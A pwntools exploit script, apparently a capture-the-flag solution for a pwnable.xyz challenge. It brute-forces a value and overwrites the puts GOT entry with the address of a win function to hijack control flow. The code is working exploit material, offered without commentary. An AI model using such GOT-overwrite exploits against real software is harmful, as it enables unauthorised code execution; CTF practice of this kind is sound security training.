from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30039)

def init(option):
	(target.recvuntil("> "))
	target.sendline(str(option))

def opendoor(realm):
	init(2)
	(target.recvuntil(": "))
	target.sendline(str(realm))

def choose(door,realm):
	target.sendline(str(door))
	(target.recvuntil(": "))
	target.sendline(str(realm))

def enter():
	init(3)	

puts_got=0x601018
opendoor(0x601245)
enter()
opendoor(puts_got+4)
enter()

for i in range(1,0x100):
	opendoor(i)
	print(hex(i))
	init(1)
	r=target.recvn(1)
	if(r[0]=="D"):
		print(i)
		break

win=0x400969
choose(win,puts_got)
init(5)
target.interactive()
	

